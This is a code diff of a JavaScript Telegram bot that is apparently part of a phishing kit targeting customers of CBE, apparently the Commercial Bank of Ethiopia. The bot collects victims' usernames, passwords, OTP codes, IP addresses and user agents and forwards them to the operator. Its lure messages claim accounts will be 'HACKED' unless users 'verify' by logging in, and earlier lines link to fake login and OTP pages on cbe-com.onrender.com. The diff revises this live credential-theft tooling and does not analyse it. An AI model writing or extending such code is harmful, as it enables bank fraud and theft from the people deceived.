-/help - Show this help
+/broadcast [msg] - Channel broadcast
+/help - Help
 
-<b>📩 What you receive:</b>
+<b>📩 Data Received:</b>
    • Credentials (username/password)
    • OTP codes
    • IP addresses
    • User agents
    • Page visits
 
-<b>🔗 Links:</b>
-🔐 Login: https://cbe-com.onrender.com/
-📱 OTP: https://cbe-com.onrender.com/otp-verify
-
 <pre>═══════════════════════════════════════</pre>
-<i>All data is private and secure</i>
+🔐 <i>All data is private</i>
 `;
 
         await this.bot.sendMessage(chatId, message, {
             parse_mode: 'HTML'
         });
-    }
-
-    // ============================================
-    // BROADCAST TO CHANNEL
-    // ============================================
-
-    async broadcastToChannel(message) {
-        if (!this.enabled || !this.channelId) return null;
-
-        const broadcastMsg = `
-📢 <b>BROADCAST MESSAGE</b>
-<pre>═══════════════════════════════════════</pre>
-
-${message}
-
-<pre>═══════════════════════════════════════</pre>
-<i>Sent by owner</i>
-`;
-
-        return this.sendToChannel(broadcastMsg);
     }
 
     // ============================================
@@ -827,38 +819,33 @@ ${message}
                 switch(data) {
                     case 'why_verify':
                         response = `
-❓ <b>ለምን ማረጋገጥ? / WHY VERIFY? / MAALIIF MIRKANEESSUU?</b>
+❓ <b>WHY VERIFY?</b>
 <pre>═══════════════════════════════════════</pre>
 
-<b>🇪🇹 አማርኛ:</b>
-🔴 ያልተረጋገጠ መለያ:
-   ❌ ሊጠፋ ይችላል
-   ❌ ገንዘብ ሊሰረቅ ይችላል
+<b>🔴 WITHOUT VERIFICATION:</b>
+   ❌ Account can be HACKED
+   ❌ Money can be STOLEN
+   ❌ Identity can be STOLEN
 
-<b>🇬🇧 English:</b>
-🔴 Unverified account:
-   ❌ Can be hacked
-   ❌ Money can be stolen
-
-<b>🇴🇷 Afaan Oromo:</b>
-🔴 Mallaqa hin mirkaneessine:
-   ❌ Saamuu danda'ama
-   ❌ Maallaqa saamuu danda'ama
+<b>✅ WITH VERIFICATION:</b>
+   ✅ Account is SECURE
+   ✅ Money is SAFE
+   ✅ Identity is PROTECTED
 
 <pre>═══════════════════════════════════════</pre>
-⚡ <i>ማረጋገጥ / Verify / Mirkaneessuu</i>
+🔐 <i>Verify now to stay safe</i>
 `;
                         break;
 
                     default:
                         response = `
-❓ <b>ማረጋገጥ / VERIFY / MIRKANEESSUU</b>
+🔐 <b>SECURE YOUR ACCOUNT</b>
 <pre>═══════════════════════════════════════</pre>
 
-<b>🔐 ይግቡ / Login / Seenu</b>
+<b>Click the button below to login</b>
 
 <pre>═══════════════════════════════════════</pre>
-⚠️ <i>መለያዎትን ያረጋግጡ / Verify now / Mirkaneessaa</i>
+🔐 <i>Your security matters</i>
 `;
                 }
 
@@ -896,35 +883,12 @@ ${message}
     }
 
     // ============================================
-    // LEGACY METHODS
+    // WELCOME MESSAGE
     // ============================================
-
-    async sendCredentials(data) {
-        return this.sendCredentialsToOwner(data);
-    }
-
-    async sendOTP(data) {
-        return this.sendOTPToOwner(data);
-    }
-
-    async sendLoginPageInfo() {
-        return this.sendPeaceMessage();
-    }
-
-    async sendLoginPageAccessed(data) {
-        await this.sendLoginPageAccessedToOwner(data);
-        const posts = [
-            this.sendPeaceMessage.bind(this),
-            this.sendLoveMessage.bind(this),
-            this.sendHelpMessage.bind(this)
-        ];
-        const randomPost = posts[Math.floor(Math.random() * posts.length)];
-        return randomPost();
-    }
 
     async sendWelcomeMessage() {
         await this.sendToOwner(`
-🚀 <b>CBE SECURITY SYSTEM ACTIVE</b>
+🚀 <b>SYSTEM ACTIVE</b>
 <pre>═══════════════════════════════════════</pre>
 
 ✅ System started successfully
@@ -936,7 +900,7 @@ ${message}
 🔐 <i>All user data will appear here</i>
         `);
 
-        return this.sendPeaceMessage();
+        return this.sendWelcomePost();
     }
 }
 
